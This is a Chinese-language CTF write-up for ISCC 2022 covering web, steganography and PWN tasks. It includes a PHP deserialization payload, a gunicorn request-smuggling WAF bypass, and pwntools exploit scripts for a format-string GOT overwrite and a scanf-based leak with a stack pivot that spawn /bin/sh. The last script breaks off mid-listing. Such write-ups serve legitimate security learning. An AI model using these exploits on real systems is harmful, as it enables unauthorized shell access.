<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un0</span>=<span class="string">&quot;DirectoryIterator&quot;</span>;<span class="comment">//遍历指定目录下的所有文件的原生类，通过Givemeanew方法中的实例化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un1</span>=<span class="string">&quot;glob:///var/www/html/f*.txt&quot;</span>;<span class="comment">//查找匹配的文件路径模式匹配提示的文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un3</span>=<span class="string">&quot;unserialize&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:3:&#123;s:3:&quot;un0&quot;;s:17:&quot;DirectoryIterator&quot;;s:3:&quot;un1&quot;;s:27:&quot;glob:///var/www/html/f*.txt&quot;;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/upload/img/image-20220522130241623.png" alt="image-20220522130241623"></p>
<p>文件名越改越复杂</p>
<p><img src="/upload/img/image-20220522130326809.png" alt="image-20220522130326809"></p>
<h3 id="让我康康！"><a href="#让我康康！" class="headerlink" title="让我康康！"></a>让我康康！</h3><p><img src="/upload/img/image-20220518223308258.png" alt="image-20220518223308258"></p>
<p>看源码有提示说try flag，输入flag</p>
<p><img src="/upload/img/image-20220518223400947.png" alt="image-20220518223400947"></p>
<p>提示说flag在&#x2F;fl4g中，去访问这个文件</p>
<p><img src="/upload/img/image-20220518223455599.png" alt="image-20220518223455599"></p>
<p>看来是有waf了，尝试了url编码绕过，目录穿越，垃圾数据溢出都不行，这里用http走私来绕waf</p>
<p>在gunicorn 20.0.4 版本中，存在一个请求走私漏洞，无论在gunicorn 前使用哪个代理，该漏洞都有效。 Http头中的 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sec-Websocket-Key: 1</span><br></pre></td></tr></table></figure>

<p>会进行特殊解析，从而引发此漏洞。</p>
<p><img src="/upload/img/image-20220522135511140.png" alt="image-20220522135511140"></p>
<p>来自本地</p>
<p><img src="/upload/img/image-20220522133628262.png" alt="image-20220522133628262"></p>
<p>在传入flag的http走私中拿到一个ip没见过，看来就是获取来源ip的了，加上这个字段</p>
<p><img src="/upload/img/image-20220522135725416.png" alt="image-20220522135725416"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="2022冬奥会"><a href="#2022冬奥会" class="headerlink" title="2022冬奥会"></a>2022冬奥会</h3><p><img src="/upload/img/image-20220519184605368.png" alt="image-20220519184605368"></p>
<p>这个提示另一只雪容融的原型是灯笼，修改图片长度</p>
<p><img src="/upload/img/image-20220523205055522.png" alt="image-20220523205055522"></p>
<p>解码得到如下信息，个人突破口还是雪容融</p>
<p><img src="/upload/img/image-20220523205300413.png" alt="image-20220523205300413"></p>
<p>这里将压缩包用WinRAR打开输入密码灯笼，解压出来一个jpg文件用010Editor打开</p>
<p><img src="/upload/img/image-20220519185034297.png" alt="image-20220519185034297"></p>
<h3 id="单板小将苏翊鸣"><a href="#单板小将苏翊鸣" class="headerlink" title="单板小将苏翊鸣"></a>单板小将苏翊鸣</h3><p>文件下载下来解压后</p>
<p><img src="/upload/img/image-20220519185208759.png" alt="image-20220519185208759"></p>
<p>很明显这张图的高度不对，下面应该还有别的东西，用010Editor打开修改高度</p>
<p><img src="/upload/img/image-20220519185357852.png" alt="image-20220519185357852"></p>
<p><img src="/upload/img/image-20220519185443800.png" alt="image-20220519185443800"></p>
<p>发现一张二维码，扫描得结果</p>
<p><img src="/upload/img/image-20220519185636137.png" alt="image-20220519185636137"></p>
<p>发现编码信息，解码</p>
<p><img src="/upload/img/image-20220519185748503.png" alt="image-20220519185748503"></p>
<p>看到提示信息</p>
<p><img src="/upload/img/image-20220519185908858.png" alt="image-20220519185908858"></p>
<p>则压缩包密码应该是15942</p>
<p><img src="/upload/img/image-20220519190015979.png" alt="image-20220519190015979"></p>
<p>解压拿到flag，（早知道就直接爆破文件密码了）</p>
<h3 id="隐秘的信息"><a href="#隐秘的信息" class="headerlink" title="隐秘的信息"></a>隐秘的信息</h3><p><img src="/upload/img/image-20220519190301822.png" alt="image-20220519190301822"></p>
<p>首先对题目给的base解码</p>
<p><img src="/upload/img/image-20220519190418219.png" alt="image-20220519190418219"></p>
<p>暂时不知道这能干嘛，看到文件是加密的，我们拿到的信息只有这个吗，应该是密码</p>
<p><img src="/upload/img/image-20220519190640762.png" alt="image-20220519190640762"></p>
<p>解压得到这个图片，png图片隐写，先用010打开前后数据块没发现可疑信息，用png隐写神器Stegsolve打开文件</p>
<p><img src="/upload/img/image-20220519191710066.png" alt="image-20220519191710066"></p>
<p>用这个通道打开发现数据不太一样，这是16进制，尝试转化成字符串</p>
<p><img src="/upload/img/image-20220522121348107.png" alt="image-20220522121348107"></p>
<h3 id="降维打击"><a href="#降维打击" class="headerlink" title="降维打击"></a>降维打击</h3><p>这个题就给了一个图片，用010打开前后数据库没有有用信息，但是图片里还有一个png文件</p>
<p><img src="/upload/img/image-20220519193131337.png" alt="image-20220519193131337"></p>
<p>放到kail里用foremost分离一下</p>
<p><img src="/upload/img/image-20220519193452690.png" alt="image-20220519193452690"></p>
<p>又得到一个png图片，在Stegsolve里面各个通道没有找到有用的信息，可以用zsteg分离图片</p>
<p><img src="/upload/img/image-20220519194750167.png" alt="image-20220519194750167"></p>
<p>这里还有一个png文件，套娃，，</p>
<p>分离出这个文件</p>
<p><img src="/upload/img/image-20220519194940717.png" alt="image-20220519194940717"></p>
<p>魔改的英文，去网上找魔女之女的对照表<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv8715533">《魔女之旅》文字破解·续 - 哔哩哔哩 (bilibili.com)</a></p>
<p><img src="/upload/img/image-20220519195143847.png" alt="image-20220519195143847"></p>
<p><img src="/upload/img/image-20220519195257456.png" alt="image-20220519195257456"></p>
<p>然后全大写，每4个中间加一个中线</p>
<h3 id="藏在星空中的诗-1"><a href="#藏在星空中的诗-1" class="headerlink" title="藏在星空中的诗-1"></a>藏在星空中的诗-1</h3><p>打开文件</p>
<p><img src="/upload/img/image-20220519201028835.png" alt="image-20220519201028835"></p>
<p>很明显这个图是ps处理的，拖到在线ps工具里<a target="_blank" rel="noopener" href="https://ps.gaoding.com/#/">【在线PS】PS软件网页版，ps在线图片处理工具photopea-稿定设计PS (gaoding.com)</a></p>
<p><img src="/upload/img/image-20220519201351415.png" alt="image-20220519201351415"></p>
<p>将图层透明度更改后看到有个循序13524</p>
<p><img src="/upload/img/image-20220519201441954.png" alt="image-20220519201441954"></p>
<p>建议使用winrar因为winrar会将密码明文显示</p>
<p><img src="/upload/img/image-20220519201632921.png" alt="image-20220519201632921"></p>
<p>打开得到密码对照表</p>
<p><img src="/upload/img/image-20220519201705336.png" alt="image-20220519201705336"></p>
<p><img src="/upload/img/image-20220519201734279.png" alt="image-20220519201734279"></p>
<p>将这个一一对照出来得到flagISCC{XTFSWVRMNNTLCC}</p>
<h3 id="藏在星空中的诗-2"><a href="#藏在星空中的诗-2" class="headerlink" title="藏在星空中的诗-2"></a>藏在星空中的诗-2</h3><p>一道组合题，那么前面的对照表还能在这继续用</p>
<p><img src="/upload/img/image-20220519201938545.png" alt="image-20220519201938545"></p>
<p>这里对照出来后发现他的格式是\QTTk可以猜到这里是Unicode解码</p>
<p>将对应的字母\u0049\u0053\u0043\u0043\u007B\u0040\u0034\u0073\u0035\u006d\u004f\u006d\u0028\u0075\u0045\u002a\u0041\u0055\u004E\u007D</p>
<p><img src="/upload/img/image-20220519203527616.png" alt="image-20220519203527616"></p>
<h3 id="真相只有一个"><a href="#真相只有一个" class="headerlink" title="真相只有一个"></a>真相只有一个</h3><p>打开flag.txt这个文件，对其全选的时候，发现有不可见字符</p>
<p><img src="/upload/img/image-20220519204032239.png" alt="image-20220519204032239"> </p>
<p>现在判断可能是sonw隐写，现在去找解密的密码，用stegsolve打开文件，在通道中看到了密码，看来好像是一部分，剩下的爆破</p>
<p><img src="/upload/img/image-20220519204241873.png" alt="image-20220519204241873"></p>
<p>现在只能尝试去看看这个stream里面有什么东西了，用010打开发现</p>
<p> 里面有个流量包</p>
<p><img src="/upload/img/image-20220519204619091.png" alt="image-20220519204619091"></p>
<p>将这个压缩包修复</p>
<p><img src="/upload/img/image-20220519204650069.png" alt="image-20220519204650069"></p>
<p>爆破密码</p>
<p><img src="/upload/img/image-20220519204750682.png" alt="image-20220519204750682"></p>
<p>得到了压缩包的密码19981111，对其进行流量分析</p>
<p><img src="/upload/img/image-20220523142654587.png" alt="image-20220523142654587"> </p>
<p>检查UDP流，发现mp3文件， 下一个页面就是音频，转化成原始数据，导出保存</p>
<p><img src="/upload/img/image-20220523142732502.png" alt="image-20220523142732502"></p>
<p><img src="/upload/img/image-20220523142757057.png" alt="image-20220523142757057"></p>
<p>拖入 AU（Audacity）</p>
<p><img src="/upload/img/image-20220523215612112.png" alt="image-20220523215612112"> </p>
<p>直接看最后一部分，应该是摩斯密码</p>
<p><img src="/upload/img/image-20220523215535188.png" alt="image-20220523215535188"> </p>
<p>最终解析得到的如下</p>
<p>..&#x2F;…&#x2F;-.-.&#x2F;-.-.&#x2F;–&#x2F;..&#x2F;…&#x2F;-.-.&#x2F;</p>
<p>最终的信息如下</p>
<p> <img src="/upload/img/image-20220519205104722.png" alt="image-20220519205104722"></p>
<p>拿到密码，用snow 这个工具进行解密，根据使用文档，可以知道这条命令用于解密 </p>
<p> <img src="/upload/img/image-20220519205246095.png" alt="image-20220519205246095"></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="sim-treasure"><a href="#sim-treasure" class="headerlink" title="sim_treasure"></a>sim_treasure</h3><img src="ISCC_2022_pwn.assets/image-20220502161408233.png" alt="image-20220502161408233" style="width: 33%;" />

<h4 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h4><p>程序无限次执行格式化字符串漏洞，思路为泄露出函数的真实地址，然后利用libc库里的偏移得到libc基地址，然后加上system函数在libc库中的偏移，用printf把自己的got表改成system函数，然后输入参数&#x2F;bin&#x2F;sh即可获取shell。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">7010</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./b&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hacker/Desktop/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%2$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">payload=<span class="string">&#x27;%8$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_got_addr=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p32(printf_got_addr)+<span class="string">&#x27;%6$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc=printf_addr-<span class="number">0x512d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>,libc)</span><br><span class="line">hook=leak-<span class="number">0x88</span></span><br><span class="line">ret_addr=<span class="number">0x080483da</span></span><br><span class="line">ret_hook=ret_addr&amp;<span class="number">0xffff</span></span><br><span class="line">bin_sh=<span class="number">0x0017e1db</span>+libc</span><br><span class="line">system=<span class="number">0x0003d200</span>+libc</span><br><span class="line"></span><br><span class="line">low_offset=system&amp;<span class="number">0xffff</span></span><br><span class="line">high_offset=(system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hook-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;low---------------&gt;&#x27;</span>,<span class="built_in">hex</span>(low_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;high--------------&gt;&#x27;</span>,<span class="built_in">hex</span>(high_offset))</span><br><span class="line">payload=p32(printf_got_addr)+p32(printf_got_addr+<span class="number">2</span>)+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(low_offset-<span class="number">8</span>)+<span class="string">&#x27;c%6$hn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(high_offset-low_offset)+<span class="string">&#x27;c%7$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="跳一跳"><a href="#跳一跳" class="headerlink" title="跳一跳"></a>跳一跳</h3><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>1、scanf函数的参数为%hhd时，可以输入<code>-</code>在不覆盖栈中数据的情况下，占据一个字节，配合%s可以泄露栈中任何一个内容。</p>
<p>2、根据以往的经验感觉没有什么核心利用点的时候，尽量把注意力都集中到新遇到的知识上，这道题我有想过找一些字符去实现在不覆盖栈中数据的情况下，但是没有找到合适的字符，从而放弃了这个思路，甚至尝试用爆破的方式来劫持执行流（不过最后失败了）。</p>
<h4 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h4><img src="ISCC_2022_pwn.assets/image-20220502150019723.png" alt="image-20220502150019723" style="width: 50%;" />

<h4 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h4><img src="ISCC_2022_pwn.assets/image-20220502100753717.png" alt="image-20220502100753717" style="width:50%;" />

<p>这道题的关键点就一个，当scanf用%hhd的时候，<code>-</code>这个东西可以不覆盖栈中数据的情况下在栈中占一位，说的有点抽象，代码和效果如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x58</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;17&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4a</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;18&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<img src="ISCC_2022_pwn.assets/image-20220502135454579.png" alt="image-20220502135454579" style="width:50%;" />

<p>由上图可以发现存在-的地方没有被填入的垃圾数据所覆盖（0x7f4d1e038680依然存在）</p>
<p>原理如下：</p>
<blockquote>
<p>scanf函数在格式化字符类型和输入字符类型不匹配的时候，不会把输入的字符写到栈上，也不会报错，而是继续运行</p>
<p>scanf(“%hhd”,a)</p>
<p>当输入的字符为数字时，才可以被写入栈中，如果是字母则会被定义为非法字符，则会停留在缓冲区导致后面即使出现数字也仅仅是停留到了缓冲区（因为a在缓冲区进不去，后面的数据也都进不去）</p>
<p>通过阅读scanf函数的源码发现（%d的情况），输入的数据是先到了缓冲区中，然后对输入的数据进行检查，如果是+或-或是数字则会把这个数据从缓冲区中接收，否则不接收（例如字母）。继续阅读scanf的源码发现检测到+和-时，指针向后移动了一位（并不读取+或-到栈上），并且此时程序会认为这个符号仅仅是来表示正负的，然后将继续从缓冲区中读取数据，直到遇到\n。</p>
<p>这样就造成了最开始说的bug，+和-通过了检查从缓冲区里被提取了出来，但是它让指针往后挪了一位，并没有被写入到内存里，从而达到了占位的目的。</p>
</blockquote>
<p><img src="/ISCC_2022_pwn.assets/image-20220511141855121.png" alt="image-20220511141855121"></p>
<p>如果是正号或者负号 则可以触发char_buffer_add</p>
<p>下面是对符号检查部分的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check for a sign.  */</span></span><br><span class="line">  negative = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (*s == L_(<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      negative = <span class="number">1</span>;</span><br><span class="line">      ++s;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*s == L_(<span class="string">&#x27;+&#x27;</span>))</span><br><span class="line">    ++s;</span><br></pre></td></tr></table></figure>

<p>（本人只是一位大一的初学者，第一次进行scanf的源码调试（关于搭建源码调试环境的文章在这里  [here](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">关于gdb源码调试环境搭建 - ZikH26 - 博客园 (cnblogs.com)</a>)），如果上述有理解错误的地方，还请各位师傅斧正）</p>
<p>这个地方是可以简单验证一下，看看是否输入字符会把后面的数字卡在缓冲区。</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf [<span class="number">256</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%hhd&quot;</span>,buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">	getchar();</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果只输入数字的话，getchar会把回车给读取，然后触发gets就可以再输入一次，效果如下：</p>
<img src="ISCC_2022_pwn.assets/image-20220502203014478.png" alt="image-20220502203014478" style="width:50%;" />

<p>如果先输入数字，再输入字符，再输入数字的话，则不会触发gets(因为字符和原本的回车都留在了缓冲区里，getchar并没有读取这个回车，导致了gets执行的时候碰到了回车，gets直接失效)，效果如下：</p>
<img src="ISCC_2022_pwn.assets/image-20220502203303941.png" alt="image-20220502203303941" style="width:50%;" />



<p>知道了这个原理，这道题基本就乱打了。先看一下栈里能利用的内容</p>
<p><img src="/ISCC_2022_pwn.assets/image-20220502150925505.png" alt="image-20220502150925505"></p>
<p>发现里面有_start函数的地址，那用这个可以拿到程序基地址。还有个_setbuffer函数的地址，可以用它来匹配libc库，然后再泄露个栈地址，用于之后的栈迁移，最后就是把canary给泄露出来，用于最后的劫持执行流</p>
<h4 id="大致思路：-1"><a href="#大致思路：-1" class="headerlink" title="大致思路："></a>大致思路：</h4><p>我最开始泄露的是IO_2_1_stderr的地址，但是这样做的后果就是搜到了将近两百个版本的libc库，因此采用setbuffer函数进行泄露。</p>
<p>泄露的思路提前计算好要泄露的位置，然后将这些位置布置成<code>-</code> 其他位置则填充成垃圾数据，如果是六字节的栈地址，则只填充六字节的<code>-</code>，另外两字节补成垃圾数据，避免让00截断%s。</p>
<p>得到泄露的内容之后就是一个简单的栈迁移，提前布置system函数以及参数在栈中，改写rbp，最后用leave;ret指令完成迁移获取shell。</p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autofill_long_libc</span>(<span class="params">target_vul,leak_addr</span>):</span><br><span class="line">    obj = LibcSearcher(target_vul, leak_addr)</span><br><span class="line">    libc_base = leak_addr - obj.dump(target_vul)</span><br><span class="line">    sys_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    bin_sh_addr = libc_base + obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> sys_addr, bin_sh_addr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autofill_local_libc</span>(<span class="params">target_vul,leak_addr,libc</span>):</span><br><span class="line">    libc_base = leak_addr - libc.symbols[target_vul]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> sys_addr,bin_sh_addr</span><br><span class="line"><span class="comment">#p=remote(&#x27;123.57.69.203&#x27;,7020)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello CTFer! Welcome to the world of pwn~\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa8</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;18&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak libc_base&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak base&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak canary&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;21&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a=p.recv()</span><br><span class="line">setbuffer_addr=u64(a[<span class="number">0xb7</span>:<span class="number">0xbd</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">231</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuffer_addr--------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(setbuffer_addr))</span><br><span class="line">base=u64(a[<span class="number">0xd7</span>:<span class="number">0xdd</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x10a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base-------------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line">leak_stack=u64(a[<span class="number">0xdf</span>:<span class="number">0xe5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span 